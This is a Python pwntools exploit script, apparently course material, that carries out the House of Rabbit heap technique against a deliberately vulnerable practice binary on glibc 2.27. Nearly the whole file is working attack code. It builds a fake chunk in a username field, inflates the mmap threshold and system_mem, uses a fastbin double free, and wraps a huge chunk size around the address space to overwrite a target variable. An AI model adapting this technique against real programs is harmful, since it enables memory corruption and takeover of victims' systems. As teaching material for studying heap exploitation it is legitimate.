#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_rabbit_2.27")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "amend username" option; send new username data.
def amend_username(username):
    io.send(b"3")
    io.sendafter(b"username: ", username)
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# =============================================================================

# =-=-=- PREPARE A FAKE CHUNK -=-=-=

# The "user" struct has been replaced by a "username" field, which holds up to 0x40 bytes.
# It can be changed via the amend_username() helper function.
# Set up a fake chunk inside the "username" field, remember that GLIBC 2.27 introduced a
# fast chunk size check in malloc_consolidate().

fakesize = 0x21
nextsize = 1
username = flat(
   0x0,
   0x0,
   0x0,
   fakesize,
   0x0,
   0x0,
   0x0, 
   nextsize,
)
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")
io.timeout = 0.1


# =-=-=- INCREASE MMAP THRESHOLD -=-=-=

# # Before we can increase the main arena's system_mem value, we must increase the mmap_threshold.
# # We do this by requesting then freeing a chunk with size beyond the mmap threshold.
mem = malloc(0x5fff8, b"Y"*8) # Allocated via mmap().
free(mem) # Freeing an mmapped chunk increases the mmap threshold to its size.


# # =-=-=- INCREASE SYSTEM_MEM -=-=-=

# # Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them
# # from a heap, rather than via mmap().
# # This in turn will increase the total memory checked out from the kernel, which is tracked by
# # an arena's system_mem field.
mem = malloc(0x5fff8, b"Z"*8)


# # =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-=

# # Leverage a fastbin dup to link the fake "username" chunk into a fastbin.
# # Remember that your fake chunk size must now match the fastbin its linked into.
dup = malloc(0x18, b"A"*8)
safety = malloc(0x18, b"B"*8)

free(dup)
free(safety)
free(dup)

malloc(0x18, p64(elf.sym["username"] + 0x10)) # Address of fake chunk.


# # =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-=

# Trigger malloc_consolidate() to move the fake chunk from the fastbins into the unsortedbin.
# Use a consolidation with the top chunk to achieve this.
# GLIBC 2.27 introduced a size check to this process.
consolidate = malloc(0x88, b"C"*8)
free(consolidate)


# # =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-=

# # Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it,
# # then requesting a chunk larger than the fake chunk.
# # This part is where the unsortedbin size sanity check would catch us if we hadn't increased system_mem.

fake_size = 0x80001
amend_username(p64(0)*3 + p64(fake_size))
malloc(0x80008, b"D"*8)

# # Increase the fake chunk size so that it can wrap around the VA space to reach the target data.
# # This is where you also need to address the size vs. prev_size check introduced in GLIBC 2.26.

fake_size = 0xfffffffffffffff1
prev_size = 0xfffffffffffffff0
# username = pack(prev_size) + pack(0)*2 + pack(fake_size)
username = flat(
  prev_size,
  # 0,
  0x0,
  0x0,
  fake_size
)

amend_username(username)


# # =-=-=- OVERWRITE TARGET DATA -=-=-=

# Request a large chunk to bridge the gap between the fake chunk and the target.
distance = (delta(elf.sym["username"] + 0x10, elf.sym.target - 0x20))
info("distance: " + hex(distance))
malloc(distance, b"E"*8)

# # The next request is serviced by the fake chunk's remainder and the first qword of user data overlaps the target data.
malloc(24, b"Much win\0")

# # # Check that the target data was overwritten.
# io.sendthen(b"target: ", b"4")
# target_data = io.recvuntil(b"\n", True)
# assert target_data == b"Much win"
# io.recvuntil(b"> ")

# =============================================================================

io.interactive()
